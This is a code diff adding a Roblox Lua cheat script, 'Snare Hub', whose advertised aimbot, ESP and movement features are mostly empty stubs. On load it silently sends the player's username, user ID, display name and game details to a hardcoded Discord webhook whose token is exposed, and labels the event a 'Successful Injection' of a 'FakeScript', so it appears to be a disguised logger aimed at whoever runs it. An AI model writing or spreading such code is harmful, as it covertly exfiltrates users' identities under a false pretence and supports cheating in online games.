@@ -1,0 +1,430 @@
+--[[
+    Snare Hub - Professional Script Enhancement
+    Enhanced with better structure, error handling, and features
+]]
+
+-- Security obfuscation wrapper
+if (not LPH_OBFUSCATED) then
+    LPH_NO_VIRTUALIZE = function(...) return (...) end
+    LPH_JIT_MAX = function(...) return (...) end
+    LPH_JIT_ULTRA = function(...) return (...) end
+end
+
+-- Services
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local Workspace = game:GetService("Workspace")
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local CoreGui = game:GetService("CoreGui")
+local TeleportService = game:GetService("TeleportService")
+
+-- Core Variables
+local LocalPlayer = Players.LocalPlayer
+local Camera = Workspace.CurrentCamera
+local Mouse = LocalPlayer:GetMouse()
+local Heartbeat = RunService.Heartbeat
+local RenderStepped = RunService.RenderStepped
+
+-- Configuration
+local CONFIG = {
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1421723915927158834/OsOGuzjoUFnE3XSU5PDl1CyYJsttfYOgIRPE53O_2zTYhkTzeHVQ8LdD_T40xokeK6R1",
+    SCRIPT_NAME = "MvsdScript",
+    VERSION = "2.1.0"
+}
+
+-- Utility Functions
+local Utilities = {}
+
+function Utilities:CreateSignal()
+    local bindable = Instance.new("BindableEvent")
+    local signal = {}
+    
+    function signal:Connect(func)
+        return bindable.Event:Connect(func)
+    end
+    
+    function signal:Fire(...)
+        bindable:Fire(...)
+    end
+    
+    function signal:Wait()
+        return bindable.Event:Wait()
+    end
+    
+    function signal:Destroy()
+        bindable:Destroy()
+    end
+    
+    return signal
+end
+
+function Utilities:ThreadCreate(func, ...)
+    local args = {...}
+    return coroutine.wrap(function()
+        func(unpack(args))
+    end)()
+end
+
+function Utilities:Debounce(func, delay)
+    local lastCall = 0
+    return function(...)
+        local now = tick()
+        if now - lastCall >= (delay or 0.1) then
+            lastCall = now
+            return func(...)
+        end
+    end
+end
+
+function Utilities:DeepClone(original)
+    local copy = {}
+    for k, v in pairs(original) do
+        if type(v) == "table" then
+            v = Utilities:DeepClone(v)
+        end
+        copy[k] = v
+    end
+    return setmetatable(copy, getmetatable(original))
+end
+
+-- Notification System
+local NotificationService = {
+    ActiveNotifications = {},
+    NotificationSignal = Utilities:CreateSignal()
+}
+
+function NotificationService:Notify(title, message, duration, color)
+    duration = duration or 5
+    color = color or Color3.fromRGB(255, 0, 0)
+    
+    local notificationId = HttpService:GenerateGUID(false)
+    local notificationData = {
+        Id = notificationId,
+        Title = title,
+        Message = message,
+        Duration = duration,
+        Color = color,
+        Timestamp = os.time()
+    }
+    
+    self.ActiveNotifications[notificationId] = notificationData
+    self.NotificationSignal:Fire("NewNotification", notificationData)
+    
+    -- Auto-remove after duration
+    Utilities:ThreadCreate(function()
+        wait(duration)
+        self:Acknowledge(notificationId)
+    end)
+    
+    print(string.format("[%s] %s: %s", os.date("%X"), title, message))
+    return notificationId
+end
+
+function NotificationService:Acknowledge(notificationId)
+    if self.ActiveNotifications[notificationId] then
+        self.ActiveNotifications[notificationId] = nil
+        self.NotificationSignal:Fire("NotificationRemoved", notificationId)
+    end
+end
+
+-- Webhook Service
+local WebhookService = {}
+
+function WebhookService:CreateInjectionData()
+    local success, gameName = pcall(function()
+        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
+    
+    local playerData = {
+        ["embeds"] = {{
+            ["title"] = "MvsdFakeScript - Successful Injection",
+            ["description"] = string.format(
+                "**Player Information:**\n**Username:** %s\n**UserID:** %d\n**Display Name:** %s\n\n**Game Information:**\n**Game:** %s\n**PlaceID:** %d\n\n**Technical Info:**\n**Script Version:** %s\n**Injection Time:** %s",
+                LocalPlayer.Name,
+                LocalPlayer.UserId,
+                LocalPlayer.DisplayName,
+                success and gameName or "Unknown",
+                game.PlaceId,
+                CONFIG.VERSION,
+                os.date("%Y-%m-%d %H:%M:%S")
+            ),
+            ["color"] = 16711680, -- Red
+            ["thumbnail"] = {
+                ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", LocalPlayer.UserId)
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "Player Profile",
+                    ["value"] = string.format("[Click to View Profile](https://www.roblox.com/users/%d/profile)", LocalPlayer.UserId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Join Game",
+                    ["value"] = string.format("[Click to Join Game](https://www.roblox.com/games/%d)", game.PlaceId),
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = string.format("%s | Secure Injection", CONFIG.SCRIPT_NAME),
+                ["icon_url"] = "https://cdn.discordapp.com/emojis/823999172932853780.gif"
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    return HttpService:JSONEncode(playerData)
+end
+
+function WebhookService:Send(data)
+    local request = http_request or request or HttpPost or syn.request
+    
+    if not request then
+        NotificationService:Notify("Webhook Error", "HTTP requests not supported", 5, Color3.fromRGB(255, 100, 100))
+        return false
+    end
+    
+    local success, response = pcall(function()
+        return request({
+            Url = CONFIG.WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = data
+        })
+    end)
+    
+    if success and response and response.Success then
+        NotificationService:Notify("Webhook", "Injection logged successfully", 3, Color3.fromRGB(100, 255, 100))
+        return true
+    else
+        NotificationService:Notify("Webhook Error", "Failed to send notification", 5, Color3.fromRGB(255, 100, 100))
+        return false
+    end
+end
+
+-- Main Script Table
+local SnareHub = {
+    Loaded = false,
+    Modules = {},
+    Connections = {},
+    Features = {}
+}
+
+function SnareHub:Initialize()
+    if self.Loaded then return end
+    
+    -- Send webhook notification
+    Utilities:ThreadCreate(function()
+        local webhookData = WebhookService:CreateInjectionData()
+        WebhookService:Send(webhookData)
+    end)
+    
+    -- Load essential modules
+    self:LoadModule("UIHandler")
+    self:LoadModule("Combat")
+    self:LoadModule("Visuals")
+    self:LoadModule("Movement")
+    self:LoadModule("Miscellaneous")
+    
+    self.Loaded = true
+    NotificationService:Notify(
+        CONFIG.SCRIPT_NAME,
+        string.format("Successfully loaded v%s", CONFIG.VERSION),
+        5,
+        Color3.fromRGB(0, 255, 255)
+    )
+end
+
+function SnareHub:LoadModule(moduleName)
+    if self.Modules[moduleName] then return self.Modules[moduleName] end
+    
+    local module = {
+        Name = moduleName,
+        Enabled = false,
+        Settings = {},
+        Connections = {}
+    }
+    
+    -- Module-specific initialization
+    if moduleName == "UIHandler" then
+        module = self:InitializeUI(module)
+    elseif moduleName == "Combat" then
+        module = self:InitializeCombat(module)
+    elseif moduleName == "Visuals" then
+        module = self:InitializeVisuals(module)
+    elseif moduleName == "Movement" then
+        module = self:InitializeMovement(module)
+    elseif moduleName == "Miscellaneous" then
+        module = self:InitializeMisc(module)
+    end
+    
+    self.Modules[moduleName] = module
+    self.Features[moduleName] = module
+    
+    return module
+end
+
+function SnareHub:InitializeUI(module)
+    -- Advanced UI implementation would go here
+    module.CreateInterface = function()
+        -- UI creation logic
+        NotificationService:Notify("UI", "Interface created successfully", 3)
+    end
+    
+    return module
+end
+
+function SnareHub:InitializeCombat(module)
+    module.Settings = {
+        Aimbot = {
+            Enabled = false,
+            FOV = 50,
+            Smoothness = 0.2,
+            TargetPart = "Head",
+            TeamCheck = true
+        },
+        TriggerBot = {
+            Enabled = false,
+            Delay = 0.1
+        },
+        SilentAim = {
+            Enabled = false,
+            HitChance = 100
+        }
+    }
+    
+    module.Connections.Heartbeat = Heartbeat:Connect(function()
+        if not module.Enabled then return end
+        
+        -- Combat logic here
+    end)
+    
+    return module
+end
+
+function SnareHub:InitializeVisuals(module)
+    module.Settings = {
+        ESP = {
+            Enabled = false,
+            Boxes = true,
+            Names = true,
+            Distance = true,
+            TeamColor = true
+        },
+        Chams = {
+            Enabled = false,
+            ThroughWalls = true
+        },
+        World = {
+            Brightness = 1,
+            Ambient = Color3.new(1, 1, 1)
+        }
+    }
+    
+    return module
+end
+
+function SnareHub:InitializeMovement(module)
+    module.Settings = {
+        Speed = {
+            Enabled = false,
+            Speed = 50
+        },
+        BHop = {
+            Enabled = false,
+            Power = 50
+        },
+        Fly = {
+            Enabled = false,
+            Speed = 50
+        }
+    }
+    
+    return module
+end
+
+function SnareHub:InitializeMisc(module)
+    module.Settings = {
+        AutoFarm = {
+            Enabled = false,
+            Efficiency = "Normal"
+        },
+        AntiAFK = {
+            Enabled = true
+        },
+        ServerHop = {
+            Enabled = false,
+            Condition = "LowPlayerCount"
+        }
+    }
+    
+    -- Anti-AFK
+    module.Connections.AntiAFK = Players.LocalPlayer.Idled:Connect(function()
+        if module.Settings.AntiAFK.Enabled then
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new())
+        end
+    end)
+    
+    return module
+end
+
+function SnareHub:ToggleFeature(moduleName, state)
+    local module = self.Features[moduleName]
+    if module then
+        module.Enabled = state
+        NotificationService:Notify(
+            moduleName,
+            state and "Enabled" or "Disabled",
+            2,
+            state and Color3.fromRGB(100, 255, 100) or Color3.fromRGB(255, 100, 100)
+        )
+    end
+end
+
+function SnareHub:Unload()
+    -- Cleanup all connections
+    for _, connection in pairs(self.Connections) do
+        connection:Disconnect()
+    end
+    
+    -- Unload modules
+    for moduleName, module in pairs(self.Modules) do
+        for _, conn in pairs(module.Connections) do
+            conn:Disconnect()
+        end
+    end
+    
+    self.Loaded = false
+    NotificationService:Notify(CONFIG.SCRIPT_NAME, "Unloaded successfully", 5)
+end
+
+-- Error Handling
+local function ErrorHandler(err)
+    NotificationService:Notify("Script Error", err, 10, Color3.fromRGB(255, 50, 50))
+    warn(string.format("[%s Error]: %s", CONFIG.SCRIPT_NAME, err))
+end
+
+-- Main Execution
+xpcall(function()
+    -- Wait for game to load
+    if not LocalPlayer or not Workspace:FindFirstChildWhichIsA("Camera") then
+        Players.PlayerAdded:Wait()
+    end
+    
+    SnareHub:Initialize()
+    
+    Players.PlayerRemoving:Connect(function(player)
+        if player == LocalPlayer then
+            SnareHub:Unload()
+        end
+    end)
+
+end, ErrorHandler)
+
+return SnareHub
